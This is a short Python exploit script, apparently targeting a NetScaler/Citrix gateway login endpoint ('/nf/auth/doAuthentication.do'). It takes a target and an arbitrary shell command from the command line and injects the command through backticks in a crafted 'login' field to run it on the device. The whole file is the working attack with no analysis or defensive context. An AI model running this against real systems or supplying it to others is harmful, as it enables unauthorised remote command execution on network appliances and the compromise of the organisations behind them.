import sys
import requests

target = sys.argv[1].rstrip("/")
command = sys.argv[2]
payload = f"pitboss PPE unexpectedly died NSPPE;:`{command}`;# X"
requests.post(target + "/nf/auth/doAuthentication.do", data={
    "login": payload, "passwd": "x", "savecredentials": "false",
    "nsg-x1-logon-button": "Log On",
}, timeout=10)
